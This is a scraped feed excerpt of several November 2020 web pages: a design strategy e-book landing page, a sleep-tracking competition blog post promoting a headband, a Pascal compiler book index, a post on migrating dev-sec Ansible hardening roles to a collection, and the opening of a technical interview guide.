November 12, 2020 | https://designstrategy.guide/the-ultimate-design-strategy-e-book/ | <a href="https://web.archive.org/web/*/https://designstrategy.guide/the-ultimate-design-strategy-e-book/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">

	
	

	
	<main id="main">
<div id="content" role="main">
	<div>
		<div>
			<div>
				
				
														
							<section id="section_1254099158">
		

		<div>
			
<div>
<p><img src="https://designstrategy.guide/wp-content/uploads/2020/03/white-layer.png"><br>
<img src="https://designstrategy.guide/wp-content/uploads/2020/10/bg-blurb.png"></p>
<div id="row-707617533">

	

	

	<div id="col-538008581">
		<div>
			
			
<h3>The Ultimate Design Strategy e-book</h3>
<p>Learn how to leverage design strategy to increase ROI, enhance your design’s value and much more.</p>
<p><a rel="noopener noreferrer" href="https://designstrategy.mykajabi.com/pl/237579" target="_blank">
    <span>CLAIM YOUR FREE COPY</span>
  </a>

		</p></div>
			</div>

	

	

	


</div>
		</div>

		

	</div></section>
	
	<section id="section_504156429">
		

		<div>
			
	<div>

		<div>
						<p><img width="1200" height="890" src="https://designstrategy.guide/wp-content/uploads/2020/11/Ipad-with-hand-small.gif" alt="DesignStrategyEbook" loading="lazy">											</p>
					</div>

		
	</div>
	
<div id="row-16433844">

	<div id="col-1347037693">
		<div>
			
			
	<div id="image_1671845267">
								<p><img width="1020" height="427" src="https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-1024x429.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-1024x429.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-300x126.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-768x322.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-600x251.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/longest-white.png 1181w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
<div id="row-153143754">

	<div id="col-1783078099">
		<div>
			
			
<h2>Why am I giving<br>you this eBook for free?</h2>
<p>Plenty of designers and product managers feel lost and frustrated while trying to prove their product design’s value and making a tangible impact. I will show you how to leverage design strategy to raise your profit.</p>
<p>I BELIEVE THAT THERE ARE 4 THINGS TO FOCUS ON:</p>
		</div>
			</div>

	
</div>

<div id="row-577317095">

	

	

	<div id="col-1086502878">
		<div>
			
			
<p>Embrace your<br>metrics and KPIs</p>

		</div>
			</div>

	


</div>
<div id="row-1612846452">

	<div id="col-970541763">
		<div>
			
			
	<div id="image_2024734304">
								<p><img width="1020" height="505" src="https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-1024x507.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-1024x507.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-300x148.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-768x380.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-600x297.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1.png 1144w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
<div id="row-1587833807">

	<div id="col-693460008">
		<div>
			
			
<h3><img loading="lazy" src="https://designstrategy.guide/wp-content/uploads/2020/11/03-cut-noshadow-SMALL.png" alt="The Design Strategy E-book" width="325" height="462" srcset="https://designstrategy.guide/wp-content/uploads/2020/11/03-cut-noshadow-SMALL.png 500w, https://designstrategy.guide/wp-content/uploads/2020/11/03-cut-noshadow-SMALL-211x300.png 211w" sizes="(max-width: 325px) 100vw, 325px"></h3>
<h3><span>Why and how? </span></h3>
<p><span>That’s what I unpack in the ebook.</span></p>
<p>It’s a bull***-free guide that’ll help you to create your design strategy, raise your conversion rates and implement better processes.</p>
		</div>
			</div>

	
</div>
<div id="row-977573247">

	<div id="col-589376732">
		<div>
			
			
	<div id="image_582957624">
								<p><img width="1020" height="445" src="https://designstrategy.guide/wp-content/uploads/2020/10/line-white-1024x447.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/line-white-1024x447.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-300x131.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-768x335.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-600x262.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white.png 1199w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
<div id="row-792279921">

	<div id="col-823362686">
		<p>
			
			
<h2>Goodies that come with this book</h2>
		</p>
			</div>

	
</div>
<div id="row-1460625462">

	

	

	<div id="col-992852958">
		<p>Research diagrams and insights</p>
		

	</div>

	
</div>
<div id="row-143760546">

	

	

	<div id="col-1071135589">
		<p>Links that’ll expand your knowledge</p>
		

	</div>

	
</div>

<div id="row-868455645">

	<div id="col-630415165">
		<div>
			
			
	<div id="image_795653637">
								<p><img width="1020" height="505" src="https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-1024x507.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-1024x507.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-300x148.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-768x380.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-600x297.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1.png 1144w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
		</div>

		

	</section>
	
	<section id="section_1845335306">
		

		<div>
			

<div id="row-1964496266">

	<div id="col-1432029106">
		<div>
			
			
<p><span>It is an eye-opener for every designer.<br>
</span></p>
<p><span>Claudia, UX designer</span></p>
		</div>
			</div>

	

	

	

	<div id="col-1501932863">
		<div>
			
			
<p><span>Too many startups fail because they don’t know which part they need to focus on (UX, dev, design). This e-book showed me new methods that I need to try out. </span></p>
<p><span>Jessica, Project Manager</span></p>
		</div>
			</div>

	
</div>
	
	
<div id="row-2082129544">

	<div id="col-219657836">
		<div>
			
			
<p><span>This book challenged my knowledge and showed me how and where to level up my design knowledge. Romina, thanks for choosing me to be part of your UX testing group. Plus, the design is just wow.<br></span></p>
<p><span>Monika, CMO</span></p>
		</div>
			</div>

	

	

	

	<div id="col-1108654738">
		<div>
			
			
<p><span>Now I know how to choose Design metrics. 🙂</span></p>
<p><span>Sara, Front-End Developer</span></p>
		</div>
			</div>

	
</div>
		</div>

		

	</section>
	
	<section id="section_1895707985">
		

		<div>
			
<div id="row-1916492638">

	<div id="col-914052076">
		<div>
			
			
	<div id="image_1592077714">
								<p><img width="1020" height="445" src="https://designstrategy.guide/wp-content/uploads/2020/10/line-white-1024x447.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/line-white-1024x447.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-300x131.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-768x335.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-600x262.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white.png 1199w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
<div id="row-335807552">

	<div id="col-583681618">
		<div>
			
			
<h3><span>Meet the author</span></h3>
	
	
<div id="row-1488056317">

	<div id="col-1496473177">
		<div>
			
			
	<div id="image_1084118413">
								<p><img width="682" height="1024" src="https://designstrategy.guide/wp-content/uploads/2020/11/03-682x1024.jpg" alt="Romina Kavcic Websi 2020" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/11/03-682x1024.jpg 682w, https://designstrategy.guide/wp-content/uploads/2020/11/03-200x300.jpg 200w, https://designstrategy.guide/wp-content/uploads/2020/11/03-768x1152.jpg 768w, https://designstrategy.guide/wp-content/uploads/2020/11/03-1024x1536.jpg 1024w, https://designstrategy.guide/wp-content/uploads/2020/11/03-600x900.jpg 600w, https://designstrategy.guide/wp-content/uploads/2020/11/03.jpg 1141w" sizes="(max-width: 682px) 100vw, 682px">						
					</p>
								

	</div>
	
		</div>
			</div>

	

	

	

	<div id="col-149823552">
		<p><span>Romina is an award-winning Design Strategist who holds a Master of Business Administration. She has 15+ years of career experience in design work and consulting across both tech startups and several marquee tech unicorns such as Stellar.org, Outfit7, Databox, Xamarin, Chipolo, Singularity.NET, etc. She is currently advising, coaching and consulting with companies on design strategy &amp; management, visual design and user experience. Her work has been published on Forbes, Hackernews, Blockgeeks, Newsbtc, Bizjournals, and featured on Apple Store.</span></p>
			</div>

	
</div>
		</div>
			</div>

	
</div>
		</div>

		

	</section>
	

						
												</div>
		</div>
	</div>
</div>


</main><!-- #main -->

<!-- .footer-wrapper -->

</div></div>]]>
            </description>
            <link>https://designstrategy.guide/the-ultimate-design-strategy-e-book/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068234</guid>
            <pubDate>Thu, 12 Nov 2020 09:55:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Neurohacking the World Sleep Championships]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068156">thread link</a>) | @pedalpete
<br/>
November 12, 2020 | https://soundmind.co/blog/neurohacking-the-world-sleep-championships | <a href="https://web.archive.org/web/*/https://soundmind.co/blog/neurohacking-the-world-sleep-championships">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-e2b9e06d42ac6600e580"><div><p>I’m the last person you’d expect to compete in the <a href="https://www.worldsleepchampionships.com/">World Sleep Championships</a>. A life-long insomniac with Central Sleep Apnea, I’ve spent the last 10 months diving into the latest in neuroscience research with the goal of not only helping insomnia sufferers, but improving Sleep Performance for the greater population.&nbsp;</p><p>The competition used the data from Oura rings which classifies sleep as REM, light or deep, and factors in the number of hours you slept, how quickly you fell asleep, and how much time you spent in each sleep state.&nbsp;</p><h3>More people have died in their sleep than during any other activity, making this the most dangerous and extreme competition that has ever taken place! </h3><p>The organizers of the World Sleep Championships decided on a tournament type structure for the competition. We started with the seeding process to get our baseline sleep data, and build the competition tree. Seeding was followed by 5 alternating nights of head-to-head competition where the highest score for each pair of competitors made it through to the next round .</p><p>The only rule was that we couldn’t take sleeping pills, everything else was fair game. Rumour had it that sleep deprivation on non-competition nights was the strategy of choice for many competitors.</p><h3>I didn’t stoop to such tactics, instead relying on the SoundMind prototype to guide me through the competition.</h3><p>It started off very well, when I averaged the 2nd highest scores through seeding, and managed the 2nd highest score of 92 points on the first night of competition<br></p><p>I believed Oura was removing points for a low amount REM sleep as a percentage of my overall sleep, so I made an adjustment to the sounds played by SoundMind to promote more REM sleep. I had a hint that this would work, but, it was a bit like running a marathon in a new pair of sneakers. A wrong move and my competition would be over.</p><p>My competitor that night put in a very solid score of 93, and apparently began his celebrations early, before seeing the 96 points I achieved with the updated version of SoundMind. This turned out to be the highest score of the entire tournament.</p><p>This was followed-up by a score of 95 the next night of competition. Far above my pre-SoundMind average in the low 70s.</p><p>Going into the semi-finals, a win looked unlikely. At 2am, somebody rang the buzzer at my apartment, it was a food delivery guy who had the wrong address. When the buzzer rang a 2nd time at 2:30am, I was wondering if this was a new tactic my opponent had discovered as the only way to destroy my sleep and chances at winning the night. Waking up, I felt pretty good, but didn’t know if I’d have the high score to win with only 89 points. However, potentially my opponent's guilt over interfering in my sleep, if she actually had done this, kept her awake fretting, and I had a few points lead over her, which led me into the finals.</p><p>I felt confident going into the finals. Not only because of the high scores I had been seeing, but due to the consistency. Anybody can have one or two nights of great sleep, but to consistently be able to sleep great every night, that’s the real challenge, and also why the competition rewards the person who can get the high score night after night.</p><div><p>Potentially with a bit of nerves coming into play, I only managed to eke out a 93 on the final night, and I wasn’t sure if that would be enough to take the win from a man with a history of scoring in the low 90s. To add to the suspense, the competition takes place around the world, and living in Australia, we’re the 2nd country to be awake, so I had to wait a day to get the final results!</p><p>It was a close final, but I managed to win out by a mere 2 points! Though I don’t feel a strong need to give an acceptance speech or thank my sponsors, I do want to thank Damian and Todd for organizing the event, and to all my fellow competitors. </p><p>The most important result here for me is that we had a fun way to test out the SoundMind tech, and see it in action as more than just another score or another great night sleep. As I’ve been using SoundMind it’s been interesting to see how quickly I’ve adapted to just accepting that a good night sleep is what happens. I almost forget what it was like being awake all night, and the agony which comes with that.&nbsp;</p></div><p>We’ll have more updates, and be sharing more data as we progress, and sign-up to the wait list to reserve your spot and get one of the first headbands so you can have amazing sleep too!</p><p>Soon we’ll all be sleeping well with SoundMind.</p></div></div></div>]]>
            </description>
            <link>https://soundmind.co/blog/neurohacking-the-world-sleep-championships</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068156</guid>
            <pubDate>Thu, 12 Nov 2020 09:40:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pascal Implementation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067899">thread link</a>) | @z3phyr
<br/>
November 12, 2020 | https://homepages.cwi.nl/~steven/pascal/book/pascalimplementation.html | <a href="https://web.archive.org/web/*/https://homepages.cwi.nl/~steven/pascal/book/pascalimplementation.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<h2>The P4 Compiler and Interpreter</h2>
<p><em>by <a href="http://www.cwi.nl/~steven/">Steven Pemberton</a>, 
<a href="http://www.cwi.nl/~steven/amsterdam.html">Amsterdam</a>, 
and <a href="http://www.it.bton.ac.uk/staff/mcd/">Martin Daniels</a></em>
</p>
<p>
<a href="https://homepages.cwi.nl/~steven/pascal/book/0intro.html">Chapter 0: Preface and Introduction</a></p>
<h2>Part 1: The Compiler</h2>
<p>
<a href="https://homepages.cwi.nl/~steven/pascal/book/1lexical.html">Chapter 1: Input and Lexical Analysis</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/2syntax.html">Chapter 2: Syntax Analysis</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/3semantic.html">Chapter 3: Semantic Analysis</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/4codegen.html">Chapter 4: Code Generation</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/5expressions.html">Chapter 5: Compiling Expressions</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/6procfunc.html">Chapter 6: Compiling Procedures and Functions</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/7statements.html">Chapter 7: Compiling Statements</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/8declarations.html">Chapter 8: Compiling Declarations</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/9program.html">Chapter 9: Compiling the Program</a>
</p>
<h2>Part 2: The Interpreter</h2>
<p>
<a href="https://homepages.cwi.nl/~steven/pascal/book/10pcode.html">Chapter 10: The P-code Machine</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/11assembler.html">Chapter 11: The Assembler</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/12interpreter.html">Chapter 12: The Interpreter</a>
</p>
<h2>Appendices</h2>
<p>
<a href="https://homepages.cwi.nl/~steven/pascal/book/13appendices.html">Chapter 13: Appendices</a>
</p>
<p>Copyright © 1982, 2002 Steven Pemberton and Martin Daniels, all rights reserved.</p>
<!--
<pre>
ok	recreate diags
ok	em F
ok	em equationvariables
ok	div
ok	p class=body
	` to '
	heading types
	pre for programs (done for 6)
li for numbered lists
	li for notes
dl's for class="Line" (to do for 3, 4, 5, 6, 7, 8, 9, 10, 11, 12)
var
kw
&lt;code&gt;
line nos: make them links to the code

deal with single note ols
fix part 2 notes
italicise comments in program fragments
move labels diagrams to semantics
redate preface
add navigation to all chapters
</pre>
-->




</div>]]>
            </description>
            <link>https://homepages.cwi.nl/~steven/pascal/book/pascalimplementation.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067899</guid>
            <pubDate>Thu, 12 Nov 2020 09:03:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Migrating our dev-sec Ansible roles to a collection]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067897">thread link</a>) | @zufallsheld
<br/>
November 12, 2020 | https://dev-sec.io/blog/2020-10-11-ansible-collection/ | <a href="https://web.archive.org/web/*/https://dev-sec.io/blog/2020-10-11-ansible-collection/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  <div>
    <article>
      
      

<p>In July 2020 we decided to move our existing Ansible roles for Linux, ssh, nginx and MySQL into an Ansible collection (<a href="https://docs.ansible.com/ansible/latest/user_guide/collections_using.html">what is a collection?</a>).</p>



<p>Having only one repository for all roles means we don’t have to duplicate code. We have one common test-suite for all roles that works the same for every role.
Also Collections are the future, as there is possibly no support for roles in the next version of Ansible Galaxy (see <a href="https://github.com/ansible/galaxy_ng/issues/58">ansible/galaxy_ng#58</a>).</p>



<p>Collections are only supported from Ansible 2.9 and onwards. However Ansible 2.8 is still supported (<a href="https://docs.ansible.com/ansible/latest/reference_appendices/release_and_maintenance.html#release-status">https://docs.ansible.com/ansible/latest/reference_appendices/release_and_maintenance.html#release-status</a>). This means we need to support the separate roles until 2.9 is the oldest maintained release.</p>



<p>We decided to use the ansible-os-hardening git repository for our new collection because it has the most stars. We didn’t want to lose our precious internet points!
We created a separate branch and worked on this one until the migration to the main branch was ready.
All the roles that lived in separate repositories should move to the <code>roles</code>-directory. It was important for us to keep the history of all roles. Fortunately we weren’t the first ones who wanted to migrate one repository with its history to another. So with the help of StackOverflow, migrating them wasn’t too hard.</p>

<p>The roles were tested with the help of test-kitchen (I wrote about it <a href="https://www.zufallsheld.de/2016/01/05/testing-ansible-roles/">here</a>) and our trusted <a href="https://dev-sec.io/baselines/">Inspec Baselines</a>. We kept the baselines but replaced test-kitchen with molecule, the de-facto standard for testing Ansible content. This made it possible to test our collection in the same way locally as done in CI. Speaking of CI: We replaced travis (good riddance - Travis <a href="https://blog.travis-ci.com/2020-11-02-travis-ci-new-billing">changed</a> their pricing model) with <a href="https://github.com/features/actions">Github Actions</a>.
Now every role inside the collection has its own pipeline that only runs when files from the role change. We still test our roles on a plethora of operating systems and the most important ones (CentOS and Ubuntu in its various versions) are all supported with all roles.</p>

<p>One problem with the new releases existed: since we wanted to re-use the ansible-os-hardening repository for the collection, we could not start from version 1.0.0 for the collection since the tag already existed. So to no break the old role we decided to continue the version from the role in the collection. This is why we started with version 7 in the collection.</p>

<p>Releasing new versions with a changelog was something we already <a href="https://github.com/dev-sec/ansible-os-hardening/issues/269">automated</a> some time ago. We wanted to keep the nicely formatted changelogs and automatic releases and modifying the existing Github Actions was no problem.</p>

<p>Our plan how to actually migrate the roles into the collection looked like this: Start building the collection and use the roles as submodules inside the monorepo. This way we can continue to support the separate roles and the roles inside the collection cannot diverge from the legacy roles.</p>

<p>When everything was migrated, we planned to archive the old roles and link to the collection.</p>



<p>There were some problems along the way but nothing we couldn’t fix.</p>

<p>Along the creation of the collection we needed to update our inspec-baselines as they needed more features to support all our operating systems.
That means we now support newer versions of MySQL and MariaDB (<a href="https://github.com/dev-sec/mysql-baseline/pull/59">https://github.com/dev-sec/mysql-baseline/pull/59</a>, <a href="https://github.com/dev-sec/mysql-baseline/pull/57">https://github.com/dev-sec/mysql-baseline/pull/57</a>) and we support Arch Linux in the linux-baseline (<a href="https://github.com/dev-sec/linux-baseline/pull/136">https://github.com/dev-sec/linux-baseline/pull/136</a>).</p>

<p>We also wanted to replace Inspec with its free distribution <a href="https://cinc.sh/">cinc-auditor</a>. This was surprisingly easy as the people behind cinc made it very easy to install cinc-auditor and use it as a drop-in replacement for Inspec. See this <a href="https://github.com/dev-sec/ansible-os-hardening/pull/291/commits/e7a47a1d342e1b45ceeeae7a1ff247f58ce3434e">commit</a> for details.</p>

<p>There was an <a href="https://github.com/ansible/ansible/issues/66304">issue</a> in Ansible that we needed to work around. This was done by <a href="https://github.com/schurzi/">@schurzi</a> here: <a href="https://github.com/dev-sec/ansible-os-hardening/pull/291/commits/3f7598b5bae80f96cad3ad068f0d57b3e1e538ed">https://github.com/dev-sec/ansible-os-hardening/pull/291/commits/3f7598b5bae80f96cad3ad068f0d57b3e1e538ed</a></p>

<p>Our mysql-hardening-role relies on a existing installation of MySQL or MariaDB. For this we used geerlingguys mysql-role because it supports many operating systems. However the role has some issues and unmerged pull requests that prevented us to use geerlingguys role as is. We had to <a href="https://github.com/dev-sec/ansible-role-mysql/">fork</a> the role and incorporate some PRs and fixes. We hope we don’t have to continuously support the fork though.</p>

<p>The hardest bug we encountered was a problem with AppArmor and MySQL on recent Ubuntu distributions. Here’s the bug: <a href="https://bugs.launchpad.net/ubuntu/+source/mysql-5.7/+bug/1610765">https://bugs.launchpad.net/ubuntu/+source/mysql-5.7/+bug/1610765</a>.
A faulty AppArmor profile prevents MySQL from starting because AppArmor blocks access to MySQL’s configuration files.
And Github Actions run on a Ubuntu 18.04 virtual machine with AppArmor enabled. So I wondered why the role does work when running molecule locally (btw: I use Arch) but not in the CI-pipeline.
It took some days to figure this one out. However once I found out the reason for this, the solution was found much faster. <a href="https://robertdebock.nl/">Robert de Bock</a> also had this problem and fixed it <a href="https://github.com/robertdebock/ansible-role-mysql/commit/7562e99099b06282391ab7ed102b393a0406d212">here</a></p>

<p>We also dropped support for some operating systems:</p>

<ul>
<li>CentOS 6 because support ends in November 2020</li>
<li>Oracle-Linux because supporting it is really cumbersome and we don’t know anyone that uses our roles on Oracle</li>
</ul>



<p>It’s here:</p>

<ul>
<li><a href="https://galaxy.ansible.com/devsec/hardening">Galaxy</a></li>
<li><a href="https://github.com/dev-sec/ansible-os-hardening/">Repository on Github</a></li>
</ul>

<p>Please share your feedback with us, ask questions on the mailing list, open issues and pull requests on our repo!</p>



<p>We plan to archive the repositories of the roles incorporated in the collection and redirect everyone to the collection. The open issues and pull requests will be moved or closed.
This way, no code gets lost and (almost) no links will be broken.</p>

<p>Of course we want to continue working on the collection and support more operating systems and more software! If you want to help, reach out!</p>



<p>I want to thank the devsec team, especially <a href="https://github.com/micheelengronne">@micheelengronne</a>, <a href="https://github.com/schurzi/">@schurzi</a> and <a href="https://github.com/chris-rock">@chris-rock</a> for their work and support in creating the collection and this awesome opensource community!</p>

    </article>
  </div>
</section></div>]]>
            </description>
            <link>https://dev-sec.io/blog/2020-10-11-ansible-collection/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067897</guid>
            <pubDate>Thu, 12 Nov 2020 09:02:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Acing your technical interview – a hiring manager’s guide]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067800">thread link</a>) | @ochronus
<br/>
November 12, 2020 | https://ochronus.online/acing-the-tech-interview/ | <a href="https://web.archive.org/web/*/https://ochronus.online/acing-the-tech-interview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-605" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
<div>

<div itemprop="text">

<p>Even though interviewing for a software engineering job can be intimidating and frustrating (with whiteboard exercises, remote coding challenges, and even full days of onsite interviews), it’s a lot easier when you know what to expect and are well-prepared.</p>
<p>I’ve interviewed a few hundred software engineering candidates in the past 10+ years and designed hiring processes. My experience is limited to startups and mid-sized companies, so take everything you read here with that in mind. My advice may not get you into <a href="https://www.facebook.com/careers/facebook-life/how-we-hire" target="_blank" rel="noopener">Facebook</a> or <a href="https://careers.google.com/how-we-hire/" target="_blank" rel="noopener">Google</a> but will definitely increase your chances at mid-sized companies with a good culture!</p>
<p>In the first part of this article, I’ll give some context, then give you an actionable list to improve your experience and chances in your next interview</p>
<p>If you’re only interested in the actionable list, feel free to skip ahead to it.</p>

<h2 id="what-you-think-about-the-technical-interview-might-be-incomplete"><span id="What_you_think_about_the_technical_interview_might_be_incomplete">What you think about the technical interview might be incomplete</span></h2>
<p>First and foremost, a technical interview is almost never only technical. Up to a certain (and honestly, very useful!) level growing as a ‘coder’ is not that complicated. Many candidates perform pretty well if we purely look at their coding skills.</p>
<p>The thing is, you’ll rarely work alone in isolation on your own codebase. You’ll have teammates, you’ll need to agree on things with them, you’ll build on others’ code and others will build on your code. You’ll need to build solutions with a certain level of quality, in a future-proof way, for extensibility, and with performance in mind. Depending on your role and level, you’ll need to architect systems. You’ll need to mentor other engineers. You’ll need to onboard new team members. You’ll need to proactively reach out to other teams in the company and understand their points of view and problems. You’ll talk to product managers, UX researchers, designers, even customers sometimes. You’ll need to manage projects, make tradeoffs and decisions, and align other engineers with that.</p>
<p>Read my article about&nbsp;<a href="https://ochronus.online/technical-interview-myths/">the most common 11 technical interview myths</a> – you’ll get a better view of how people think on the other side of the table.</p>
<h2 id="types-and-stages-of-technical-interviews"><span id="Types_and_stages_of_technical_interviews">Types and stages of technical interviews</span></h2>
<p>Most companies use a combination of these steps:</p>
<ul><li>Screening call with a recruiter – We’re interested in your basic motivations; we’d like to have a gut feeling about what you’re looking for and do some sanity check here. You might get asked about your salary requirements, support you need for visa or relocation, timelines (when could you start, etc.). Some recruiters will also ask you whether you have applied elsewhere, so they know how urgent this is for them and you.</li><li>Screening call with the hiring manager – Expect some deeper dive into your experience on multiple fronts – tech and ‘soft skills’ alike. As a hiring manager, I’ll prepare by checking out your CV for talking points, maybe even your LinkedIn profile, and definitely GitHub. I’m not trying to judge you; I’m just looking for points of connection. I’ll answer any questions you have about the role, the company, the culture, potential teams you’d be joining, etc. My ultimate goal with this is twofold: would we be a good match for your (and vice versa) and whether I think you’d be successful in the role.</li><li>Remote technical screening – An alternative, or at some places precursor to the online coding exercise. This is with a human on the other end of the line – solving tech problems together; usually, you walk them through your solution.</li><li>Online coding exercises (LeetCode, HackerRank, etc.) – I know you all hate this. We need such a step to filter out people who can’t even code at all early on. You’d be surprised about the number of such applicants. I avoid algorithm/data structure exercises here and try to come up with somewhat interesting ones. Some companies use a much heavier set of exercises and judge your technical skills solely on this. While I disagree with that strategy, you need to get prepared for this, too.</li><li>Take-home assignment – this is one of the most polarizing interview steps for engineers. Some hate it, claiming it’s just free labor for the companies, and it takes too much time. Others love it because they feel they have the freedom to give it much time, really showing off their skills in their own comfortable environment. <a href="https://levelup.gitconnected.com/take-home-assignment-mistakes-which-will-guarantee-someone-else-gets-the-job-36bcee1cec1d" target="_blank" rel="noopener">Whichever camp you’re in</a>, you can expect some companies requiring this. You usually get a somewhat specified problem to solve, and you’re given different levels of freedom on how to solve it – some companies don’t mind you choosing whichever stack you like; others will even specify the framework.</li><li>Onsite workshop / remote workshop – I think this is the most interesting of all steps (well, for me, at least). It’s about solving problems together with people from the company in a simulated environment. You’ll need to show your communication, decision-making, and even prioritization skills here. Sure, people will look at your code’s quality, too, but ‘soft skills’ are just as important here. We’ll get strong signals about how it would be to have you on the team.</li></ul>
<h2 id="cracking-the-technical-interview"><span id="Cracking_the_technical_interview">Cracking the technical interview</span></h2>
<h3 id="ask-the-recruiter-or-the-hiring-manager-before-the-interview"><span id="Ask_the_recruiter_or_the_hiring_manager_before_the_interview">Ask the recruiter or the hiring manager before the interview</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 3">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1.jpg.webp 306w, https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1-300x294.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20306%20300'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 306px) 100vw, 306px">
<img width="306" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20306%20300'%3E%3C/svg%3E" alt="ask the recruiter or hiring manager 1" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1.jpg 306w, https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1-300x294.jpg 300w" data-lazy-sizes="(max-width: 306px) 100vw, 306px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1.jpg">
</picture>
</figure>
<p>Take the guesswork out of the equation. If you feel you don’t have enough information to prepare for your technical interview, just ask for more! We’re here to help you succeed. I really mean it. Sometimes we aren’t doing a great job with sharing enough information proactively about the interview steps but that’s not intentional! I’m always happy to help you prepare better – ask about anything, please. You’re doing both of us a favor with that. Simply ask during the previous technical interview step or just drop me or the recruiter an email at any time.</p>
<h3 id="show-up-on-time"><span id="Show_up_on_time">Show up on time</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 4">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1.jpg.webp 399w, https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1-300x226.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20399%20300'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 399px) 100vw, 399px">
